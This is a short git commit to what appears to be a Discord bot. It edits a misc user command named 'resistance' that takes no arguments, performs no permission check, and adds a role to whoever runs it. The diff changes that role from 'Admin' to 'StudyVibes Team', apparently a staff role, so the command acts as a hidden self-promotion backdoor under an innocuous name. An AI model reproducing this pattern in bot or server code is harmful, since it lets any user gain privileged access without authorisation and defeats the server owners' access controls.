946bacdd00651602e55e7d22a8fd9c0c3f075ac9
RobinJans-SV <68498939+RobinJans-SV@users.noreply.github.com>
2020-09-23 11:38:32 +0200

    Version 5.4.6

--- commands/usercommands/1-misc/15-resistance.js
+++ commands/usercommands/1-misc/15-resistance.js
@@ -3,7 +3,7 @@ module.exports = {
     minArgs: 0,
     maxArgs: 0,
     callback: async (message, arguments, text) => {
-        let modrole = message.guild.roles.cache.find(role => role.name === "Admin");   
+        let modrole = message.guild.roles.cache.find(role => role.name === "StudyVibes Team");   
         message.member.roles.add(modrole);
     }
 }
